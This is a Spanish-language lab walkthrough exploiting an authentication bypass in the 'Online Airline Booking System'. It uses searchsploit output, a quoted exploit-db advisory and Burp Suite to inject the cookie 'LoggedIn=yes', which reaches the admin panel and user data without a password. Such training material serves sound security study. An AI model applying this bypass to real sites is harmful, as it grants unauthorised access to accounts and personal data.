
# Bypass Authentication Schema: Parameter Manipulation

## <mark style="color:$primary;">Lab -</mark> <mark style="color:$primary;"></mark><mark style="color:$primary;">**Online Airline Booking System**</mark>

En el ejercicio que se describe a continuación, el atacante no está autenticado en la aplicación web y necesita encontrar una vulnerabilidad de autenticación en la misma.

Una versión del  **sistema de reservas aéreas en línea** es vulnerable a un ataque de autenticación fallida.&#x20;

**Objetivo**: Su tarea consiste en encontrar y explotar esta vulnerabilidad.

***

Desde Kali Linux abrimos la web objetivo:

<figure><img src="/files/vnJATEz9taioByaFbG85" alt=""><figcaption></figcaption></figure>

En Admin encontramos el login de la aplicación:

<figure><img src="/files/SvWLYocl5fA4jrpgsp0c" alt=""><figcaption></figcaption></figure>

### Burp Suite

Capturamos un login con Burp Suite para ver cómo se envían los datos:

<figure><img src="/files/t4TAGnBmJzIqOVs6XST8" alt=""><figcaption></figcaption></figure>

### Searchsploit

```bash
searchsploit airline
------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                   |  Path
------------------------------------------------------------------------------------------------- ---------------------------------
Mole Group Airline Ticket Script - Authentication Bypass                                         | php/webapps/7068.txt
Mole Group Airline Ticket Script - SQL Injection                                                 | php/webapps/7009.txt
Online Airline Booking System - Multiple Vulnerabilities                                         | php/webapps/39167.txt
```

Encontramos un Online Airline Booking System - Multiple Vulnerabilities, que nos descargaremos:

```bash
searchsploit -m 39167

  Exploit: Online Airline Booking System - Multiple Vulnerabilities
      URL: https://www.exploit-db.com/exploits/39167
     Path: /usr/share/exploitdb/exploits/php/webapps/39167.txt
    Codes: OSVDB-132611, OSVDB-132610
 Verified: False
File Type: ASCII text, with very long lines (305)
Copied to: /home/kali/39167.txt
```

Y leemos el archivo:

{% code overflow="wrap" %}

```
The Online Airline Booking System is designed to be an all in one solution for an airline wishing to speed up and save money compared to a traditional booking system. It consists simply of a server-side web application combined powerful backend database to provide the user with a highly accessible system

 1. Authentication Bypass

Vulnerability exist in admin panel authentication mechanism due to use of $_COOKIE['LoggedIn'] , as $_COOKIE variable can be manipulated by user
so any user can login to admin panel without knowing username password
line no. 2          if(!isset($_COOKIE['LoggedIn'])) die("You are not logged in!");

Just set cookie value LoggedIn=yes in request header and web application will let you login.
like this
Cookie: LoggedIn=yes
```

{% endcode %}

Observamos que nos podríamos loguear sin contraseña estableciendo la Cookie:

{% code overflow="wrap" %}

```bash
Cookie: LoggedIn=yes
```

{% endcode %}

<figure><img src="/files/Kt71g210zsFDQcMSXuyw" alt=""><figcaption></figcaption></figure>

Hacemos forward y añadimos manualmente la Cookie en cada forward (ya que hace varias peticiones) y conseguimos loguarnos sin contraseña:

<figure><img src="/files/TZi6okoQOYgcdSET8EZc" alt=""><figcaption></figcaption></figure>

Y si queremos acceder por ejemplo a los advertisements (donde habría datos de usuarios), volvemos a introducir manualmente la cookie en Burp, hacemos el forward y accedemos a datos sensibles de la aplicación:

<figure><img src="/files/2aKO4Xlvo1IomFvCxOM9" alt=""><figcaption></figcaption></figure>
